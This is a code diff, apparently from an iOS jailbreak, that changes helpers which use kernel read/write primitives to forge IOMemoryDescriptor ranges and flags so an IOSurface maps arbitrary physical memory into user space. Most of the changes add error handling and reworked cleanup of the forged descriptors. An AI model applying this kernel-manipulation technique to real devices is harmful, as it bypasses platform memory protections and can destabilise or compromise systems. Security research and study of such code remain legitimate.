@@ -44,9 +44,9 @@ uint64_t IOMemoryDescriptor_get_ranges(uint64_t memoryDescriptor)
 	return kread_ptr(memoryDescriptor + 0x60);
 }
 
-void IOMemoryDescriptor_set_ranges(uint64_t memoryDescriptor, uint64_t ranges)
+int IOMemoryDescriptor_set_ranges(uint64_t memoryDescriptor, uint64_t ranges)
 {
-	kwrite64(memoryDescriptor + 0x60, ranges);
+	return kwrite64(memoryDescriptor + 0x60, ranges);
 }
 
 uint64_t IOMemorydescriptor_get_size(uint64_t memoryDescriptor)
@@ -135,67 +135,81 @@ int IOSurface_map(uint64_t pa, uint64_t size, void **uaddr)
 			free(fakeRanges);
 			return -1;
 		}
-		IOMemoryDescriptor_set_ranges(desc, fakeRangesKA);
+
+		// Reserve the cleanup record before changing the descriptor. This avoids
+		// leaving a live fake pointer behind if realloc fails.
 		struct IOSurface_toCleanup *newCleanups = realloc(cleanups, (cleanupsCount + 1) * sizeof(*cleanups));
 		if (!newCleanups) {
-			IOMemoryDescriptor_set_ranges(desc, ranges);
 			free(fakeRanges);
 			return -1;
 		}
 		cleanups = newCleanups;
+		if (IOMemoryDescriptor_set_ranges(desc, fakeRangesKA) != 0) {
+			free(fakeRanges);
+			return -1;
+		}
 		cleanups[cleanupsCount].descriptor = desc;
 		cleanups[cleanupsCount].origRanges = ranges;
 		cleanups[cleanupsCount].fakeRangesUA = fakeRanges;
 		cleanupsCount++;
 	}
 	else {
-		kwrite64(ranges, pa);
-		kwrite64(ranges + 8, size);
+		if (kwrite64(ranges, pa) != 0 || kwrite64(ranges + 8, size) != 0) return -1;
 	}
-
-	IOMemoryDescriptor_set_size(desc, size);
-
-	kwrite64(desc + 0x70, 0);
-	kwrite64(desc + 0x18, 0);
-	kwrite64(desc + 0x90, 0);
-
+	if (IOMemoryDescriptor_set_size(desc, size) != 0 ||
+		kwrite64(desc + 0x70, 0) != 0 ||
+		kwrite64(desc + 0x18, 0) != 0 ||
+		kwrite64(desc + 0x90, 0) != 0) return -1;
 	IOMemoryDescriptor_set_wired(desc, true);
-
 	uint32_t flags = IOMemoryDescriptor_get_flags(desc);
 	IOMemoryDescriptor_set_flags(desc, (flags & ~0x410) | 0x20);
-
 	IOMemoryDescriptor_set_memRef(desc, 0);
-
 	IOSurfaceRef mappedSurfaceRef = IOSurfaceLookupFromMachPort(surfaceMachPort);
+	if (!mappedSurfaceRef) return -1;
 	*uaddr = IOSurfaceGetBaseAddress(mappedSurfaceRef);
+	if (!*uaddr) {
+		CFRelease(mappedSurfaceRef);
+		return -1;
+	}
 
 /*********************** roothide specific **************************************/
     vm_prot_t cur_prot, max_prot;
     kern_return_t kr = vm_remap(mach_task_self(), uaddr, size, 0, VM_FLAGS_ANYWHERE, mach_task_self(), (vm_address_t)*uaddr, FALSE, &cur_prot, &max_prot, VM_INHERIT_NONE);
-    assert (kr == KERN_SUCCESS);
+    if (kr != KERN_SUCCESS) {
+		CFRelease(mappedSurfaceRef);
+		return -1;
+	}
 	/*********************************************************************************/
 
+	CFRelease(mappedSurfaceRef);
 	return 0;
 }
-
 void IOSurface_map_cleanup(void)
 {
-	// Once physrw is installed, the primitive can safely write the original
-	// ranges structure again. A stale exploit primitive must never attempt it.
-	if (gPrimitives.krwMinSafeReadSize > 0x10 || cleanupsCount == 0) return;
+	if (cleanupsCount == 0) return;
 
+	// In the fake-ranges path, the original range structure was never changed.
+	// Only restore the descriptor's pointer; writing pa/size into origRanges
+	// would corrupt the IOSurface's real backing descriptor. Use the post-exploit
+	// primitive and retain failed records for a later retry.
+	unsigned pending = 0;
 	for (unsigned i = 0; i < cleanupsCount; i++) {
 		uint64_t desc = cleanups[i].descriptor;
 		uint64_t origRanges = cleanups[i].origRanges;
 		uint64_t *fakeRangesUA = cleanups[i].fakeRangesUA;
-		kwrite64(origRanges, fakeRangesUA[0]);
-		kwrite64(origRanges + 8, fakeRangesUA[1]);
-		IOMemoryDescriptor_set_ranges(desc, origRanges);
-		free(fakeRangesUA);
+		if (IOMemoryDescriptor_set_ranges(desc, origRanges) == 0) {
+			free(fakeRangesUA);
+		} else {
+			if (pending != i) cleanups[pending] = cleanups[i];
+			pending++;
+		}
 	}
-	free(cleanups);
-	cleanups = NULL;
-	cleanupsCount = 0;
+
+	cleanupsCount = pending;
+	if (cleanupsCount == 0) {
+		free(cleanups);
+		cleanups = NULL;
+	}
 }
 
 static mach_port_t IOSurface_kalloc_getSurfacePort(uint64_t size)
